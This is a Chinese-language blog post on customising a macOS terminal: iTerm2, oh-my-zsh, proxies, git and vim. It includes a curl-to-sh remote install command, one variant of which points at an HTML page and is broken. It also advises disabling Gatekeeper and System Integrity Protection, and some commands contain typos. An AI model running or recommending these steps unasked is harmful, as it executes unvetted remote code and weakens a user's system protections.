newer. iTerm2 brings the terminal into the modern age with features you never knew you always wanted.</p><p>官方下载地址：<a href="https://iterm2.com/">https://iterm2.com</a><br>也可以使用brew 进行安装：brew install iterm2</p></blockquote><p>上来先展示最终优化的效果</p><p><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/image-20210421170605437.png" alt="image-20210421170605437"></p><h4 id="启动页美化"><a href="#启动页美化" class="headerlink" title="启动页美化"></a>启动页美化</h4><p><code>screenfetch</code>是一款可以用来生成那些漂亮的终端主题信息和用 ASCII 构成的发行版标志，它可以自动检测你的发行版并显示 ASCII 版的发行版标志，并且在右边显示一些有价值的信息。</p><p>mac下安装：</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#Install screenfetch</span>brew <span class="token function">install</span> screenfetch<span class="token comment">#run screenfetch on macOS big Sur</span>screenfetc <span class="token parameter variable">-D</span> <span class="token string">'Mac OS X'</span></code></pre><p>安装完成之只需要在<code>Preferences-&gt;Profiles-&gt;General-&gt;Command</code>里面输入<code>screenfetch</code>就可以</p><p><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/image-20210421142614071.png" alt="image-20210421142614071"></p><h4 id="标签页位置调整"><a href="#标签页位置调整" class="headerlink" title="标签页位置调整"></a>标签页位置调整</h4><p>标签页的位置在上面容易误关，在下面又不好点击，于是乎它就来到了左边。在<code>Preferences-&gt;Appearance-General</code>里面将<code>Tab bar location</code>选择为<code>left</code>即可。</p><p>顺便如果你选择激活<code>Status bar location</code>建议选择<code>Bottom</code>放在下面。</p><p><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/image-20210421161517558.png" alt="image-20210421161517558"></p><h4 id="字体设置"><a href="#字体设置" class="headerlink" title="字体设置"></a>字体设置</h4><p>在<code>Preferences-&gt;Profiles-&gt;Text-&gt;Font</code>里面可以选择字体字号，这里选用的是<code>Monaco</code>。需要注意的是在下文中所提及的某些ohmyzsh的主题可能会对字体有特殊的要求。</p><p><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/image-20210421161907169.png" alt="image-20210421161907169"></p><p>设置完字体以后还需要对字符编码进行一下设置，不然会很奇妙的乱码，在<code>Preferences-&gt;Profiles-&gt;Terminal-&gt;Ternimal Emulation</code>中选择<code>Character encoding:Unicode(UTF-8)</code>即可</p><p><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/image-20210421161943023.png" alt="image-20210421161943023"></p><h4 id="窗体设置"><a href="#窗体设置" class="headerlink" title="窗体设置"></a>窗体设置</h4><p>窗体的设置可以按照下面标注的自行设置成自己喜欢的感觉就好。</p><p><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/image-20210421164126615.png" alt="image-20210421164126615"></p><h4 id="热键呼出iTerm2"><a href="#热键呼出iTerm2" class="headerlink" title="热键呼出iTerm2"></a>热键呼出iTerm2</h4><p>有时候在浏览网页做一些配置的时候，频繁的切换应用很麻烦，分屏显示又很丑，这个时候就可以用上这招了。在<code>Preferences-&gt;Keys-&gt;Hotkey</code>里面选择<code>Create a Dedicated Hotkey Window</code></p><p><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/image-20210421171216800.png" alt="image-20210421171216800"></p><p>在设置里面首先选择启动方式，这里推荐<code>Double-tap key</code>防止热键莫名的冲突。最后如果你想在全屏模式下依然能够唤醒iTerm2的话勾选上<code>Floating window</code></p><p><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/image-20210421171321260.png" alt="image-20210421171321260"></p><h4 id="实用热键设置"><a href="#实用热键设置" class="headerlink" title="实用热键设置"></a>实用热键设置</h4><ol><li><p>以单词为单位前进后退，在<code>Preferences-&gt;Keys-&gt;Key Bindings</code>里面选择左下角的➕新建快捷键，<code>Keyboard Shortcut</code>自行决定，<code>Action</code>选择<code>Send Escape Sequence</code>，<code>Esc+</code>选择填入<code>f</code>和<code>b</code>。</p><p><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/image-20210421194646964.png" alt="前进"></p><p><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/image-20210421194557178.png" alt="后退"></p></li><li><p>在当前目录打开新标签页&#x2F;窗口，在<i class="fab fa-apple"></i><i class="fas fa-arrow-right"></i>系统偏好设置<i class="fas fa-arrow-right"></i>键盘<i class="fas fa-arrow-right"></i>快捷键<i class="fas fa-arrow-right"></i>服务里，找到<code>New iTerm2 Tab/Window Here</code>自行设定即可</p><p><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/image-20210421195611315.png" alt="image-20210421195611315"></p></li></ol><h3 id="实用命令"><a href="#实用命令" class="headerlink" title="实用命令"></a>实用命令</h3><ol><li><p>允许App的来源<br>当我们安装第三方软件经常会需要<i class="fab fa-apple"></i><i class="fas fa-arrow-right"></i>系统偏好设置<i class="fas fa-arrow-right"></i>安全性与隐私<i class="fas fa-arrow-right"></i>通用里要选择允许从任何来源下载的App，但是最新的系统这个选项默认都是隐藏的，因此需要在终端输入以下命令来显示选项。</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># APP安装开启任何来源</span><span class="token function">sudo</span> spctl --master-disabl</code></pre><p><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/image-20210421194902100.png" alt="image-20210421194902100"></p></li><li><p>修改主机名&#x2F;共享名称</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 修改主机名</span><span class="token function">sudo</span> scutil <span class="token parameter variable">--set</span> HostName xxxxx<span class="token comment"># 修改共享名称</span><span class="token function">sudo</span> scutil <span class="token parameter variable">--set</span> ComputerName xxxxx</code></pre></li><li><p>安装xcode工具<br>Command Line Tools 是在 Xcode 中的一款工具，macOS 下不少开发工具都会依赖这个，所以我们手动安装一下，后面安装其他工具可以省下不少麻烦</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#安装 xcode 命令行工具</span>xcode-select <span class="token parameter variable">--install</span></code></pre></li><li><p>关闭SIP（可选的）<br> 后面不关闭SIP的话类似于 <code>proxychains-ng</code> 这种代理神器就无法使用。重启Mac，按住<code>Option</code>键进入启动盘选择模式，按 <code>⌘</code> + <code>R</code> 进入 Recovery 模式。「菜单栏」 -&gt;「 实用工具（Utilities）」-&gt; 「终端（Terminal）」：</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 关闭SIP</span>csrutil disable<span class="token comment"># 开启SIP</span>csrutil <span class="token builtin class-name">enable</span><span class="token comment"># 查看SIP状态</span>csrutil statusSystem Integrity Protection status: disabled.<span class="token punctuation">(</span>表明关闭成功<span class="token punctuation">)</span></code></pre></li><li><p>计算文件hash</p><pre class="language-bash" data-language="bash"><code class="language-bash">md5 file_nameshasum <span class="token parameter variable">-a</span> <span class="token number">1</span>/256 file_name</code></pre></li></ol><h3 id="命令行代理"><a href="#命令行代理" class="headerlink" title="命令行代理"></a>命令行代理</h3><p>🔬上网以后，命令行默认是不走代理的，因此我们需要一些工具或者环境变量的设置</p><h4 id="proxychains"><a href="#proxychains" class="headerlink" title="proxychains"></a>proxychains</h4><p>终端命令行下代理神器，可以让指定的命令走设置好的代理，内网渗透、科学上网必备工具</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 安装</span>brew <span class="token function">install</span> proxychains-ng<span class="token comment"># 配置文件</span><span class="token function">vim</span> /usr/local/etc/proxychains.conf<span class="token comment"># 将结尾的 socks4 127.0.0.1 9095改为你代理的端口</span>socks5 <span class="token number">127.0</span>.0.1 xxxx</code></pre><h4 id="环境变量法"><a href="#环境变量法" class="headerlink" title="环境变量法"></a>环境变量法</h4><p>使用proxychains的话需要关闭SIP，对于不想关闭的同学的话也可以使用环境变量法</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">export</span> <span class="token assign-left variable">http_proxy</span><span class="token operator">=</span>http://127.0.0.1:1087<span class="token punctuation">;</span><span class="token builtin class-name">export</span> <span class="token assign-left variable">https_proxy</span><span class="token operator">=</span>http://127.0.0.1:1087<span class="token punctuation">;</span></code></pre><p>这会临时在当前终端的 shell 环境生成一个 http 与 https 代理，想要永久代理的话就将这两条命令写入到 .zshrc 的配置文件即可，再补充一个使用 socks5 代理的命令：</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">export</span> <span class="token assign-left variable">all_proxy</span><span class="token operator">=</span><span class="token string">"socks5://127.0.0.1:1086"</span></code></pre><p>这种方法更便捷的一种实现方式，也是最像proxychains的方式就是利用alias设置别名开关</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">proxy</span><span class="token operator">=</span><span class="token string">'export all_proxy=socks5://127.0.0.1:1081'</span><span class="token assign-left variable">unproxy</span><span class="token operator">=</span><span class="token string">'unset all_proxy'</span></code></pre><h3 id="ZSH-ohmyzsh"><a href="#ZSH-ohmyzsh" class="headerlink" title="ZSH &amp; ohmyzsh"></a>ZSH &amp; ohmyzsh</h3><blockquote><p><strong>Z shell</strong>（<strong>Zsh</strong>）是一款可用作交互式登录的shell及脚本编写的命令解释器。Zsh对Bourne shell做出了大量改进，同时加入了Bash、ksh及tcsh的某些功能。</p><p>简而言之，Zsh就是很好用的shell，自2019年起，macOS的默认Shell已从Bash改为Zsh。由于Zsh的配置略显繁琐，所以这里引入了一个开源的框架<code>ohmyzsh</code>。<br>Oh My Zsh is a delightful, open source, community-driven framework for managing your Zsh configuration. It comes bundled with thousands of helpful functions, helpers, plugins, themes, and a few things that make you shout…<br>根据官方所形容的，ohmyzsh是一个拥有大量功能、插件、主题等等优秀功能的框架来帮助我们使用Zsh，当然事实也是如此。那么如何使用ohmyzsh呢？</p></blockquote><h4 id="安装Zsh-ohmyzsh"><a href="#安装Zsh-ohmyzsh" class="headerlink" title="安装Zsh&amp;ohmyzsh"></a>安装Zsh&amp;ohmyzsh</h4><ol><li>首先检查一下默认的shell是不是Zsh。如果是进入步骤4，如果不是进入步骤2.  <pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token environment constant">$SHELL</span><span class="token comment">#如果默认shell是zsh则会输出以下结果</span><span class="token comment">#/bin/zsh   </span></code></pre></li><li>检查系统里有没有安装Zsh，如果有进入步骤4，如果没有进入步骤3  <pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> /etc/shells<span class="token comment">#如果系统中存在zsh则输出结果中会出现zsh</span><span class="token comment"># List of acceptable shells for chpass(1).</span><span class="token comment"># Ftpd will not allow users to connect who are not using</span><span class="token comment"># one of these shells.</span>/bin/bash/bin/csh/bin/dash/bin/ksh/bin/sh/bin/tcsh/bin/zsh</code></pre></li><li>安装Zsh  <pre class="language-bash" data-language="bash"><code class="language-bash">brew <span class="token function">install</span> <span class="token function">zsh</span></code></pre></li><li>将默认shell修改为Zsh  <pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#Recent Mac OS versions</span>chsh <span class="token parameter variable">-s</span> /usr/local/bin/zsh<span class="token comment">#Mac OS High Sierra and before</span>chsh <span class="token parameter variable">-s</span> /bin/zsh</code></pre></li><li>安装ohmyzsh  <pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 可选命令：全局代理(速度更快)</span>proxychains4 <span class="token parameter variable">-q</span> /bin/bash<span class="token comment"># 或者这样添加一个临时代理(速度更快)</span><span class="token builtin class-name">export</span> <span class="token assign-left variable">ALL_PROXY</span><span class="token operator">=</span>socks5://127.0.0.1:1086<span class="token comment"># curl安装</span><span class="token function">sh</span> <span class="token parameter variable">-c</span> <span class="token string">"<span class="token variable"><span class="token variable">$(</span><span class="token function">curl</span> <span class="token parameter variable">-fsSL</span> https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh<span class="token variable">)</span></span>"</span><span class="token comment">#没有代理的也可以用国内gitee安装</span><span class="token function">sh</span> <span class="token parameter variable">-c</span> <span class="token string">"<span class="token variable"><span class="token variable">$(</span><span class="token function">curl</span> <span class="token parameter variable">-fsSL</span> https://gitee.com/mirrors/oh-my-zsh/blob/master/tools/install.sh<span class="token variable">)</span></span>"</span></code></pre></li><li>相关报错解决  <pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 如果输入zsh命令有如下报错</span><span class="token punctuation">[</span>oh-my-zsh<span class="token punctuation">]</span> Insecure completion-dependent directories detected:<span class="token punctuation">..</span>.<span class="token comment"># 修改目录权限即可解决</span><span class="token function">chmod</span> <span class="token number">755</span> /usr/local/share/zsh<span class="token function">chmod</span> <span class="token number">755</span> /usr/local/share/zsh/site-functions</code></pre></li></ol><h4 id="主题和插件"><a href="#主题和插件" class="headerlink" title="主题和插件"></a>主题和插件</h4><p>ohmyzsh是有很多默认主题和第三方主题的，这里的，在.zshrc文件里面修改即可，自带主题的效果可以在github查看 <a href="https://github.com/ohmyzsh/ohmyzsh/wiki/Themes">https://github.com/ohmyzsh/ohmyzsh/wiki/Themes</a></p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 修改配置文件</span><span class="token function">vim</span> ~/.zshrc<span class="token assign-left variable">ZSH_THEME</span><span class="token operator">=</span><span class="token string">"theunraveler"</span></code></pre><p>插件推荐三个必不可少的，剩下的就看个人需求</p><ol><li>autojump<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#macOS 安装</span>brew <span class="token function">install</span> autojump<span class="token comment">#配置.zshrc</span><span class="token assign-left variable">plugins</span><span class="token operator">=</span><span class="token punctuation">(</span>autojump<span class="token punctuation">)</span><span class="token comment"># 第一次 cd 进入某个目录</span>~ <span class="token builtin class-name">cd</span> Documents/HexoHexo <span class="token builtin class-name">cd</span> ~<span class="token comment"># 后面就可以直接通过 j 命令跳转到那个目录</span>~ j hexo</code></pre></li><li>zsh-autosuggestions<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#macOS 安装</span><span class="token comment"># 拷贝到 plugins 目录下</span><span class="token function">git</span> clone git://github.com/zsh-users/zsh-autosuggestions <span class="token variable">$ZSH_CUSTOM</span>/plugins/zsh-autosuggestions<span class="token comment">#配置.zshrc</span><span class="token assign-left variable">plugins</span><span class="token operator">=</span><span class="token punctuation">(</span>autojump zsh-autosuggestions<span class="token punctuation">)</span></code></pre></li><li>zsh-syntax-highlighting<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#macOS 安装</span><span class="token comment">#拷贝到 plugins 目录下</span><span class="token function">git</span> clone https://github.com/zsh-users/zsh-syntax-highlighting.git <span class="token variable">$&#123;ZSH_CUSTOM<span class="token operator">:-</span>~<span class="token operator">/</span>.oh-my-zsh<span class="token operator">/</span>custom&#125;</span>/plugins/zsh-syntax-highlighting<span class="token comment">#配置.zshrc</span><span class="token assign-left variable">plugins</span><span class="token operator">=</span><span class="token punctuation">(</span>autojump zsh-autosuggestions zsh-syntax-highlighting<span class="token punctuation">)</span></code></pre></li></ol><h4 id="别名（alias）设置"><a href="#别名（alias）设置" class="headerlink" title="别名（alias）设置"></a>别名（alias）设置</h4><p>别名是一种给常用命令起别称的做法，可以极大提高我们的效率，例如可以设置<code>alias la=&#39;ls- la&#39;</code>这样我们只需要敲入la即可完成想要的命令<br>下面给出几个GXX常用的别名，大家可以自行设置：</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">cls</span><span class="token operator">=</span>clear<span class="token assign-left variable">sz</span><span class="token operator">=</span><span class="token string">'source ~/.zshrc'</span><span class="token assign-left variable">vz</span><span class="token operator">=</span><span class="token string">'open /Applications/Visual\ Studio\ Code.app/ ~/.zshrc'</span></code></pre><h3 id="Git"><a href="#Git" class="headerlink" title="Git"></a>Git</h3><h4 id="配置socks5代理"><a href="#配置socks5代理" class="headerlink" title="配置socks5代理"></a>配置socks5代理</h4><p>git的环境配置主要是由于网路限制的问题，因此需要走代理才能更方便的pull&#x2F;push，配置方法如下</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 我这里习惯用1086端口 具体根据自己的配置来灵活设置</span><span class="token function">git</span> config <span class="token parameter variable">--global</span> http.proxy <span class="token string">'socks5://127.0.0.1:1086'</span><span class="token function">git</span> config <span class="token parameter variable">--global</span> https.proxy <span class="token string">'socks5://127.0.0.1:1086'</span><span class="token comment"># 取消git代理</span><span class="token function">git</span> config <span class="token parameter variable">--global</span> <span class="token parameter variable">--unset</span> http.proxy<span class="token function">git</span> config <span class="token parameter variable">--global</span> <span class="token parameter variable">--unset</span> https.proxy<span class="token comment"># 查看 git 配置</span><span class="token function">cat</span> ~/.gitconfig<span class="token comment"># 或者这样也可以查看git的配置</span><span class="token function">git</span> config <span class="token parameter variable">-l</span></code></pre><h4 id="配置邮箱和用户名"><a href="#配置邮箱和用户名" class="headerlink" title="配置邮箱和用户名"></a>配置邮箱和用户名</h4><p>GitHub会根据配置文件里的邮箱显示对应的commit记录的头像，如果不配置就会没有头像（ps：如果用Fork提交就不用配置了）</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 配置邮箱 </span><span class="token function">git</span> config <span class="token parameter variable">--global</span> user.email <span class="token string">"xxxxx@xxx.com"</span><span class="token comment"># 配置用户名</span><span class="token function">git</span> config <span class="token parameter variable">--global</span> user.name <span class="token string">"xxx"</span></code></pre><h4 id="Git-client"><a href="#Git-client" class="headerlink" title="Git-client"></a>Git-client</h4><p>这里推荐一下老毛子开发的Git-Fork这个图形化客户端，非常方便进行git的各种操作。下载地址：<a href="https://git-fork.com/">https://git-fork.com/</a></p><p>这里用一张官网的图展示一下</p><p><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/carousel_mainMac.jpg" alt="img"></p><p>很方便的commit、pull、push、branch。</p><p>还可以轻松调用你喜欢的工具</p><p><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/image-20210423073709259.png" alt="image-20210423073709259"></p><h4 id="别名设置"><a href="#别名设置" class="headerlink" title="别名设置"></a>别名设置</h4><p>在终端中输入<code>alias</code>命令，可以看到大量的git命令的别名，大家可以采用记忆或者设置自己喜欢的别名</p><p><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210508114920.png" alt="20210508114920"></p><h3 id="Vim"><a href="#Vim" class="headerlink" title="Vim"></a>Vim</h3><p>macOS自带vim命令，这里简单做一些美化，至于vim的学习使用，后续会再做介绍</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 查看 vim 版本</span><span class="token function">vim</span> <span class="token parameter variable">--version</span><span class="token comment"># 这样查看版本号也可以</span><span class="token function">ls</span> /usr/share/vim/<span class="token comment"># 查看自带的配色方案  vim80 当前vim 的版本号（macOS Mojave）</span><span class="token function">ls</span> /usr/share/vim/vim80/colors</code></pre><p>对于vim进行配置需要首先新建一个vim的配置文件</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">vim</span> ~/.vimrc</code></pre><p>内容如下</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">set</span> nu                <span class="token string">"显示行号colorscheme desert    "</span>颜色方案显示syntax on             "打开语法高亮</code></pre><p><strong>参考链接</strong></p><ol><li>国光-<a href="https://www.sqlsec.com/2019/12/macos.html">国光的macOS配置优化记录</a></li><li>Github issue-<a href="https://github.com/szc188/MSI-B460M-MORTAR-10700K-5500XT-OC/issues/7">https://github.com/szc188/MSI-B460M-MORTAR-10700K-5500XT-OC/issues/7</a></li><li>ohmyzsh-<a href="https://github.com/ohmyzsh/ohmyzsh/wiki/Installing-ZSH">https://github.com/ohmyzsh/ohmyzsh/wiki/Installing-ZSH</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> macOS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> macOS </tag>
            
            <tag> 系统设置 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
